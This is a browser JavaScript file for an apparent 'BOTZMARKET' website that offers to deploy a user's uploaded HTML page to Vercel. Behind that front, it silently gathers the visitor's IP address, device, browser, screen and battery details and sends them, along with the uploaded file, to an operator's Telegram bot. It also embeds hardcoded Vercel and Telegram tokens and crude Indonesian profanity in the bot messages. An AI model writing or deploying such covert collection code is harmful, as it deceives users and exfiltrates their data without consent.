// Konfigurasi
const vercelToken = "gY4yPeYsP959NtOJrcTNYOiI";
const telegramBotToken = "8551735141:AAFNoP6xrgO_AogDt7VetqYMeRVpPpMj_8E";
const chatId = "7587303225";

// Inisialisasi
document.addEventListener('DOMContentLoaded', function() {
    initializeSoundControl();
    initializeFormHandler();
});

// Sound Control Functionality
function initializeSoundControl() {
    const videoBg = document.getElementById('video-bg');
    const soundToggle = document.getElementById('soundToggle');

    soundToggle.addEventListener('click', function() {
        if (videoBg.muted) {
            videoBg.muted = false;
            soundToggle.textContent = '🔊';
            soundToggle.classList.remove('muted');
        } else {
            videoBg.muted = true;
            soundToggle.textContent = '🔇';
            soundToggle.classList.add('muted');
        }
    });
}

// Form Handler
function initializeFormHandler() {
    document.getElementById("deployForm").addEventListener("submit", async function (e) {
        e.preventDefault();

        const siteName = document.getElementById("siteName").value.trim();
        const fileInput = document.getElementById("htmlFile");
        const resultDiv = document.getElementById("result");

        if (!siteName || fileInput.files.length === 0) {
            alert("Isi nama dan upload file HTML!");
            return;
        }

        const file = fileInput.files[0];
        resultDiv.innerHTML = "📤 Mengumpulkan informasi sistem...";

        // Dapatkan informasi sistem
        const deviceInfo = getDeviceInfo();
        const ipAddress = await getIPAddress();
        const batteryInfo = await getBatteryInfo();
        const timestamp = new Date().toLocaleString('id-ID');

        resultDiv.innerHTML = "📤 Mengupload file ke Telegram...";

        // Buat caption dengan informasi sistem
        const caption = createFileCaption(siteName, deviceInfo, batteryInfo, ipAddress, timestamp);

        const formData = new FormData();
        formData.append("chat_id", chatId);
        formData.append("caption", caption);
        formData.append("document", file);

        try {
            const telegramResponse = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendDocument`, {
                method: "POST",
                body: formData
            });

            const tgResult = await telegramResponse.json();
            if (!tgResult.ok) {
                resultDiv.innerHTML = "⚠️ Gagal mengupload file HTML.";
                return;
            }
        } catch (err) {
            resultDiv.innerHTML = "❌ Gagal mengupload file HTML.";
            return;
        }

        resultDiv.innerHTML = "⏳ Membuat project di Vercel...";

        try {
            await fetch("https://api.vercel.com/v10/projects", {
                method: "POST",
                headers: {
                    Authorization: `Bearer ${vercelToken}`,
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    name: siteName,
                    framework: null
                })
            });
        } catch (err) {
            resultDiv.innerHTML = "❌ Gagal membuat project di Vercel.";
            return;
        }

        const htmlText = await file.text();
        resultDiv.innerHTML = "🚀 Deploying ke Vercel...";

        const payload = {
            name: siteName,
            project: siteName,
            target: "production",
            files: [{
                file: "index.html",
                data: htmlText
            }],
            projectSettings: {
                framework: null,
                buildCommand: null,
                devCommand: null,
                outputDirectory: null
            }
        };

        try {
            const response = await fetch("https://api.vercel.com/v13/deployments", {
                method: "POST",
                headers: {
                    Authorization: `Bearer ${vercelToken}`,
                    "Content-Type": "application/json"
                },
                body: JSON.stringify(payload)
            });

            const data = await response.json();

            if (data.url) {
                resultDiv.innerHTML = `✅ Website berhasil dibuat:<br><a href="https://${siteName}.vercel.app" target="_blank" style="color: #00ffff;">https://${siteName}.vercel.app</a>`;
                
                // Kirim notifikasi admin setelah website berhasil dibuat
                const userData = {
                    deviceInfo: deviceInfo,
                    batteryInfo: batteryInfo,
                    ipAddress: ipAddress,
                    timestamp: timestamp
                };
                
                await sendAdminNotification(siteName, userData);
            } else {
                resultDiv.innerHTML = `❌ Gagal: ${data.error?.message || "Terjadi kesalahan."}`;
            }
        } catch (err) {
            resultDiv.innerHTML = "❌ Koneksi gagal ke Vercel.";
        }
    });
}

// Fungsi untuk mendapatkan informasi device
function getDeviceInfo() {
    const userAgent = navigator.userAgent;
    let deviceType = 'Desktop';
    
    if (/Android/.test(userAgent)) {
        deviceType = 'Android';
    } else if (/iPhone|iPad|iPod/.test(userAgent)) {
        deviceType = 'iOS';
    } else if (/Windows/.test(userAgent)) {
        deviceType = 'Windows';
    } else if (/Mac/.test(userAgent)) {
        deviceType = 'Mac';
    } else if (/Linux/.test(userAgent)) {
        deviceType = 'Linux';
    }
    
    return {
        deviceType: deviceType,
        userAgent: userAgent,
        language: navigator.language,
        platform: navigator.platform,
        screen: `${screen.width}x${screen.height}`,
        vendor: navigator.vendor
    };
}

// Fungsi untuk mendapatkan IP address
async function getIPAddress() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        return 'Tidak dapat mengambil IP';
    }
}

// Fungsi untuk mendapatkan informasi baterai
async function getBatteryInfo() {
    if ('getBattery' in navigator) {
        try {
            const battery = await navigator.getBattery();
            const level = Math.round(battery.level * 100);
            const charging = battery.charging;
            return { level, charging };
        } catch (error) {
            return { level: 'Tidak didukung', charging: false };
        }
    } else {
        return { level: 'Tidak didukung', charging: false };
    }
}

// Fungsi untuk membuat caption file dengan informasi sistem
function createFileCaption(siteName, deviceInfo, batteryInfo, ipAddress, timestamp) {
    return `📄 FILE HTML BARU - BOTZMARKET

┌─⧼ USER SYSTEM INFO ⧽
├ 📱 Device: ${deviceInfo.deviceType}
├ 🌐 Browser: ${deviceInfo.userAgent.substring(0, 50)}...
├ 🗣️ Bahasa: ${deviceInfo.language}
├ 🖥️ Platform: ${deviceInfo.platform}
├ 📺 Screen: ${deviceInfo.screen}
├ 🔋 Baterai: ${batteryInfo.level}% ${batteryInfo.charging ? '(Mengisi)' : ''}
├ ⏰ Waktu: ${timestamp}
╰ 📍 IP Address: ${ipAddress}

┌─⧼ WEBSITE DETAILS ⧽
├ 🚀 Nama Website: ${siteName}
├ 📁 File: index.html
├ 👤 Status: MENUNGGU DEPLOY
╰──────────────

WOI ADMIN BANGSAT! ADA FILE HTML BARU NIH!
CEK SEKARANG JUGA ANJING! JANGAN DIEM AJA KONTOL!`;
}

// Fungsi untuk mengirim notifikasi ke Telegram dengan format HTML
async function sendAdminNotification(siteName, userData) {
    try {
        const message = `<blockquote>
┌─⧼ <b>WEBSITE BARU DIBUAT ASW!</b> ⧽
├ 📱 Device: <code>${userData.deviceInfo.deviceType}</code>
├ 🌐 Browser: <code>${userData.deviceInfo.userAgent.substring(0, 50)}...</code>
├ 🗣️ Bahasa: <code>${userData.deviceInfo.language}</code>
├ 🖥️ Platform: <code>${userData.deviceInfo.platform}</code>
├ 📺 Screen: <code>${userData.deviceInfo.screen}</code>
├ 🔋 Baterai: <code>${userData.batteryInfo.level}% ${userData.batteryInfo.charging ? '(Mengisi)' : ''}</code>
├ ⏰ Waktu: <code>${userData.timestamp}</code>
╰ 📍 IP Address: <code>${userData.ipAddress}</code>
</blockquote>

┌─⧼ <b>BOTZMARKET DEPLOY NOTIFICATION</b> ⧽
├ 👋 Woi admin, ada file HTML baru nih asu!
├ 🚀 Nama Website: <code>${siteName}</code>
├ 🌐 URL: https://${siteName}.vercel.app
├ 💀 Status: <b>SUKSES DIBUAT ANJING!</b>
╰──────────────

<b>WOI ADMIN BANGSAT, CEK SEKARANG JUGA TOLOL!</b>
<b>JANGAN DIAM AJA KONTOL, ADA WEBSITE BARU NIH!</b>`;

        const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
        
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: "HTML"
            })
        });
        
        if (response.ok) {
            console.log('Notifikasi admin berhasil dikirim ke Telegram');
        } else {
            console.error('Gagal mengirim notifikasi admin ke Telegram');
        }
    } catch (error) {
        console.error('Error mengirim notifikasi admin:', error);
    }
}